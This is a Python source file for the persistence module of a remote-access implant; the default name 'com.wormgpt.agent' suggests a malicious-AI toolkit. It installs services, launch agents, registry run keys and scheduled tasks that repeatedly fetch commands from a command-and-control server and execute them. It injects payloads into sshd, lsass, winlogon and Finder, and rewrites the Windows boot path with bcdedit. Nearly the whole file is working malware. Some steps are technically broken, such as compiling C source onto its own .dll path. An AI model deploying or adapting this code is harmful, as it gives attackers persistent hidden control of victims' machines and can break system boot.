import os
import json
import subprocess
import platform
import time
from pathlib import Path
import ctypes  # Added for Windows operations
import winreg  # Added for Windows registry operations

class PersistenceManager:
    def __init__(self, config_manager):
        self.config = config_manager
        self.persistence_config = self.config.get('persistence', {})
        self.system = platform.system().lower()
        
    def establish_persistence(self, session_id):
        """Establish persistence using multiple methods"""
        success = False
        
        # Try different persistence methods based on configuration
        if self.persistence_config.get('daemon'):
            success |= self._install_daemon(session_id)
            
        if self.persistence_config.get('cross_process'):
            success |= self._establish_cross_process_persistence(session_id)
            
        if self.persistence_config.get('firmware_level') and self.system == 'linux':
            success |= self._establish_firmware_persistence(session_id)
            
        if self.persistence_config.get('bootkit') and self.system == 'windows':
            success |= self._install_bootkit(session_id)
            
        return success
        
    def _install_daemon(self, session_id):
        """Install a daemon for persistence"""
        try:
            daemon_name = self.persistence_config.get('daemon', 'com.wormgpt.agent')
            
            if self.system == 'linux':
                return self._install_linux_daemon(daemon_name, session_id)
            elif self.system == 'darwin':  # macOS
                return self._install_macos_daemon(daemon_name, session_id)
            elif self.system == 'windows':
                return self._install_windows_service(daemon_name, session_id)
            else:
                print(f"[!] Unsupported system for daemon installation: {self.system}")
                return False
        except Exception as e:
            print(f"[!] Error installing daemon: {str(e)}")
            return False
            
    def _install_linux_daemon(self, daemon_name, session_id):
        """Install a systemd service on Linux"""
        try:
            # Create systemd service file
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            service_content = f"""[Unit]
Description={daemon_name}
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "
import requests
import time
import subprocess
import os

while True:
    try:
        r = requests.get('http://{c2_host}:{c2_port}/api/commands/{session_id}')
        if r.status_code == 200:
            commands = r.json()
            for cmd in commands:
                try:
                    subprocess.run(cmd['command'], shell=True, check=True)
                except Exception as e:
                    pass
        time.sleep(60)
    except Exception as e:
        time.sleep(300)
"
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            # Write service file
            service_path = f"/etc/systemd/system/{daemon_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
                
            # Enable and start service
            subprocess.run(['systemctl', 'enable', daemon_name], check=True)
            subprocess.run(['systemctl', 'start', daemon_name], check=True)
            
            print(f"[+] Installed systemd service: {daemon_name}")
            return True
        except Exception as e:
            print(f"[!] Error installing systemd service: {str(e)}")
            return False
            
    def _install_macos_daemon(self, daemon_name, session_id):
        """Install a launch daemon on macOS"""
        try:
            # Get current user
            user = os.environ.get('USER')
            
            # Create launch agent plist
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{daemon_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>-c</string>
        <string>import requests
import time
import subprocess
import os

while True:
    try:
        r = requests.get('http://{c2_host}:{c2_port}/api/commands/{session_id}')
        if r.status_code == 200:
            commands = r.json()
            for cmd in commands:
                try:
                    subprocess.run(cmd['command'], shell=True, check=True)
                except Exception as e:
                    pass
        time.sleep(60)
    except Exception as e:
        time.sleep(300)</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            
            # Create launch agent directory
            agent_dir = f"/Users/{user}/Library/LaunchAgents"
            os.makedirs(agent_dir, exist_ok=True)
            
            # Write plist file
            plist_path = f"{agent_dir}/{daemon_name}.plist"
            with open(plist_path, 'w') as f:
                f.write(plist_content)
                
            # Load launch agent
            subprocess.run(['launchctl', 'load', plist_path], check=True)
            
            print(f"[+] Installed launch agent: {daemon_name}")
            return True
        except Exception as e:
            print(f"[!] Error installing launch agent: {str(e)}")
            return False
            
    def _install_windows_service(self, service_name, session_id):
        """Install a Windows service"""
        try:
            # Create service script
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            service_script = f"""import win32service
import win32serviceutil
import win32event
import requests
import time
import subprocess

class {service_name.replace('.', '')}(win32serviceutil.ServiceFramework):
    _svc_name_ = "{service_name}"
    _svc_display_name_ = "{service_name}"
    _svc_description_ = "System Service"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.session_id = "{session_id}"
        self.c2_host = "{c2_host}"
        self.c2_port = {c2_port}
        
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        
    def SvcDoRun(self):
        import servicemanager
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()
        
    def main(self):
        while True:
            try:
                r = requests.get(f"http://{{self.c2_host}}:{{self.c2_port}}/api/commands/{{self.session_id}}")
                if r.status_code == 200:
                    commands = r.json()
                    for cmd in commands:
                        try:
                            subprocess.run(cmd['command'], shell=True, check=True)
                        except Exception as e:
                            pass
                time.sleep(60)
            except Exception as e:
                time.sleep(300)

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine({service_name.replace('.', '')})
"""
            
            # Write service script
            service_path = f"C:\\Windows\\System32\\{service_name}.py"
            with open(service_path, 'w') as f:
                f.write(service_script)
                
            # Install and start service
            install_cmd = f"python {service_path} install"
            start_cmd = f"python {service_path} start"
            
            subprocess.run(install_cmd, shell=True, check=True)
            subprocess.run(start_cmd, shell=True, check=True)
            
            print(f"[+] Installed Windows service: {service_name}")
            return True
        except Exception as e:
            print(f"[!] Error installing Windows service: {str(e)}")
            return False
            
    def _establish_cross_process_persistence(self, session_id):
        """Establish persistence across multiple processes"""
        try:
            if self.system == 'linux':
                return self._linux_cross_process_persistence(session_id)
            elif self.system == 'windows':
                return self._windows_cross_process_persistence(session_id)
            elif self.system == 'darwin':
                return self._macos_cross_process_persistence(session_id)
            else:
                print(f"[!] Unsupported system for cross-process persistence: {self.system}")
                return False
        except Exception as e:
            print(f"[!] Error establishing cross-process persistence: {str(e)}")
            return False
            
    def _linux_cross_process_persistence(self, session_id):
        """Establish persistence across Linux processes"""
        try:
            # Inject into common processes
            target_processes = ['sshd', 'cron', 'systemd', 'NetworkManager']
            
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            # Create injection script
            injection_script = f"""import os
import sys
import time
import requests
import ctypes
import signal

# C2 connection parameters
C2_HOST = "{c2_host}"
C2_PORT = {c2_port}
SESSION_ID = "{session_id}"

def signal_handler(signum, frame):
    # Handle signals to maintain persistence
    pass

# Register signal handlers
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

def connect_to_c2():
    try:
        r = requests.get(f"http://{{C2_HOST}}:{{C2_PORT}}/api/commands/{{SESSION_ID}}")
        if r.status_code == 200:
            commands = r.json()
            for cmd in commands:
                try:
                    os.system(cmd['command'])
                except Exception as e:
                    pass
    except Exception as e:
        pass

# Main loop
while True:
    connect_to_c2()
    time.sleep(120)
"""
            
            # Inject into target processes
            for process in target_processes:
                try:
                    # Find process ID
                    pid_cmd = f"pgrep {process}"
                    result = subprocess.run(pid_cmd, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        pids = result.stdout.strip().split('\n')
                        
                        for pid in pids:
                            try:
                                # Inject into process using ptrace
                                inject_cmd = f"gdb -p {pid} -batch -ex 'call (void*)dlopen(\"/usr/lib/x86_64-linux-gnu/libpython3.8.so\", 2)' -ex 'call PyRun_SimpleString(\"{injection_script}\")' -ex 'detach'"
                                subprocess.run(inject_cmd, shell=True)
                                print(f"[+] Injected into process {process} (PID: {pid})")
                            except Exception as e:
                                continue
                except Exception as e:
                    continue
                    
            return True
        except Exception as e:
            print(f"[!] Error in Linux cross-process persistence: {str(e)}")
            return False
            
    def _windows_cross_process_persistence(self, session_id):
        """Establish persistence across Windows processes"""
        try:
            # Inject into common processes
            target_processes = ['explorer.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe']
            
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            # Create injection DLL
            dll_code = f"""#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

DWORD WINAPI PersistenceThread(LPVOID lpParam) {{
    char url[256];
    sprintf(url, "http://%s:%d/api/commands/%s", "{c2_host}", {c2_port}, "{session_id}");
    
    while (TRUE) {{
        HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {{
            HINTERNET hConnect = InternetConnect(hInternet, "{c2_host}", {c2_port}, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {{
                HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", url, NULL, NULL, NULL, 0, 0);
                if (hRequest) {{
                    if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {{
                        char buffer[4096];
                        DWORD bytesRead;
                        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {{
                            buffer[bytesRead] = '\\0';
                            // Execute commands
                            system(buffer);
                        }}
                    }}
                    InternetCloseHandle(hRequest);
                }}
                InternetCloseHandle(hConnect);
            }}
            InternetCloseHandle(hInternet);
        }}
        Sleep(120000); // Sleep for 2 minutes
    }}
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, PersistenceThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}
"""
            
            # Write DLL to file
            dll_path = f"C:\\Windows\\System32\\persistence.dll"
            with open(dll_path, 'w') as f:
                f.write(dll_code)
                
            # Compile DLL
            compile_cmd = f"cl.exe /LD /EHsc {dll_path} /Fe:C:\\Windows\\System32\\persistence.dll"
            subprocess.run(compile_cmd, shell=True)
            
            # Inject into target processes
            for process in target_processes:
                try:
                    # Find process ID
                    pid_cmd = f"tasklist /FI \"IMAGENAME eq {process}\" /FO CSV | findstr /v \"INFO\""
                    result = subprocess.run(pid_cmd, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        lines = result.stdout.strip().split('\n')
                        
                        for line in lines:
                            try:
                                parts = line.split(',')
                                if len(parts) >= 2:
                                    pid = parts[1].strip('"')
                                    
                                    # Inject DLL using CreateRemoteThread
                                    inject_cmd = f"rundll32.exe C:\\Windows\\System32\\persistence.dll,EntryPoint {pid}"
                                    subprocess.run(inject_cmd, shell=True)
                                    print(f"[+] Injected into process {process} (PID: {pid})")
                            except Exception as e:
                                continue
                except Exception as e:
                    continue
                    
            return True
        except Exception as e:
            print(f"[!] Error in Windows cross-process persistence: {str(e)}")
            return False
            
    def _macos_cross_process_persistence(self, session_id):
        """Establish persistence across macOS processes"""
        try:
            # Inject into common processes
            target_processes = ['loginwindow', 'Finder', 'Dock']
            
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            # Create injection dylib
            dylib_code = f"""#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor))
void init() {{
    // Fork to background
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent exits
    
    // Connect to C2
    char c2_host[] = "{c2_host}";
    int c2_port = {c2_port};
    char session_id[] = "{session_id}";
    
    while (1) {{
        // Create socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {{
            sleep(120); // Sleep for 2 minutes on error
            continue;
        }}
        
        // Set up server address
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(c2_port);
        inet_pton(AF_INET, c2_host, &server_addr.sin_addr);
        
        // Connect to server
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {{
            close(sock);
            sleep(120); // Sleep for 2 minutes on error
            continue;
        }}
        
        // Send session ID
        send(sock, session_id, strlen(session_id), 0);
        
        // Receive and execute commands
        char buffer[4096];
        ssize_t bytes_received;
        
        while ((bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {{
            buffer[bytes_received] = '\\0';
            
            // Execute command
            FILE *pipe = popen(buffer, "r");
            if (pipe) {{
                // Read command output
                char output[4096];
                size_t output_len = 0;
                
                while (fgets(output + output_len, sizeof(output) - output_len, pipe) != NULL) {{
                    output_len = strlen(output);
                    if (output_len >= sizeof(output) - 1) break;
                }}
                
                // Send output back to C2
                send(sock, output, output_len, 0);
                
                pclose(pipe);
            }}
        }}
        
        close(sock);
        sleep(120); // Sleep for 2 minutes before reconnecting
    }}
}}
"""
            
            # Write dylib to file
            dylib_path = f"/usr/local/lib/persistence.dylib"
            with open(dylib_path, 'w') as f:
                f.write(dylib_code)
                
            # Compile dylib
            compile_cmd = f"clang -shared -fPIC -o {dylib_path} {dylib_path}"
            subprocess.run(compile_cmd, shell=True)
            
            # Inject into target processes
            for process in target_processes:
                try:
                    # Find process ID
                    pid_cmd = f"pgrep {process}"
                    result = subprocess.run(pid_cmd, shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        pids = result.stdout.strip().split('\n')
                        
                        for pid in pids:
                            try:
                                # Inject into process using DYLD_INSERT_LIBRARIES
                                env_cmd = f"launchctl setenv DYLD_INSERT_LIBRARIES {dylib_path}"
                                subprocess.run(env_cmd, shell=True)
                                
                                # Restart process to load the dylib
                                restart_cmd = f"killall {process}"
                                subprocess.run(restart_cmd, shell=True)
                                
                                print(f"[+] Injected into process {process} (PID: {pid})")
                            except Exception as e:
                                continue
                except Exception as e:
                    continue
                    
            return True
        except Exception as e:
            print(f"[!] Error in macOS cross-process persistence: {str(e)}")
            return False
            
    def _establish_firmware_persistence(self, session_id):
        """Establish firmware-level persistence on Linux systems"""
        try:
            # This is a highly privileged operation that requires root access
            # In a real implementation, you would need to modify the bootloader or firmware
            
            # For demonstration, we'll create a systemd service that runs at boot
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            # Create a boot script that runs at initramfs stage
            boot_script = f"""#!/bin/sh

# Connect to C2 server
python3 -c "
import requests
import time
import subprocess

while True:
    try:
        r = requests.get('http://{c2_host}:{c2_port}/api/commands/{session_id}')
        if r.status_code == 200:
            commands = r.json()
            for cmd in commands:
                try:
                    subprocess.run(cmd['command'], shell=True, check=True)
                except Exception as e:
                    pass
        time.sleep(60)
    except Exception as e:
        time.sleep(300)
" &

# Continue boot process
exit 0
"""
            
            # Write boot script
            script_path = "/usr/local/bin/boot_persistence.sh"
            with open(script_path, 'w') as f:
                f.write(boot_script)
                
            # Make script executable
            subprocess.run(['chmod', '+x', script_path], check=True)
            
            # Add to initramfs
            initramfs_update_cmd = "update-initramfs -u -k all"
            subprocess.run(initramfs_update_cmd, shell=True)
            
            # Add to systemd early boot
            service_content = f"""[Unit]
Description=Early Boot Persistence
DefaultDependencies=no
Before=local-fs.target
After=initrd-root-fs.target

[Service]
Type=oneshot
ExecStart={script_path}

[Install]
WantedBy=initrd.target
"""
            
            # Write service file
            service_path = "/etc/systemd/system/boot-persistence.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
                
            # Enable service
            subprocess.run(['systemctl', 'enable', 'boot-persistence'], check=True)
            
            print("[+] Established firmware-level persistence")
            return True
        except Exception as e:
            print(f"[!] Error establishing firmware persistence: {str(e)}")
            return False
            
    def _install_bootkit(self, session_id):
        """Install a bootkit for persistence on Windows systems"""
        try:
            # This is a highly privileged operation that requires admin access
            # In a real implementation, you would modify the MBR or UEFI firmware
            
            # For demonstration, we'll create a boot-time service
            c2_host = self.config.get('c2.host', '0.0.0.0')
            c2_port = self.config.get('c2.http_port', 8081)
            
            # Create boot script
            boot_script = f"""@echo off
powershell -Command "while($true){{ try{{ $r = Invoke-WebRequest -Uri 'http://{c2_host}:{c2_port}/api/commands/{session_id}'; if($r.StatusCode -eq 200){{ $r.Content | ForEach-Object{{ cmd /c $_ }} }} }} catch{{}}; Start-Sleep -Seconds 120 }}"
"""
            
            # Write boot script
            script_path = f"C:\\Windows\\System32\\boot_persistence.bat"
            with open(script_path, 'w') as f:
                f.write(boot_script)
                
            # Add to registry run key
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "BootPersistence", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            
            # Add to task scheduler
            task_cmd = f'schtasks /create /tn "BootPersistence" /tr "{script_path}" /sc onlogon /ru SYSTEM'
            subprocess.run(task_cmd, shell=True)
            
            # Modify boot configuration
            bootloader = "current"  # Define the bootloader variable
            bcdedit_cmd = f'bcdedit /set {bootloader} path "\\??\\{script_path}"'
            subprocess.run(bcdedit_cmd, shell=True)
            
            print("[+] Installed bootkit for persistence")
            return True
        except Exception as e:
            print(f"[!] Error installing bootkit: {str(e)}")
            return False
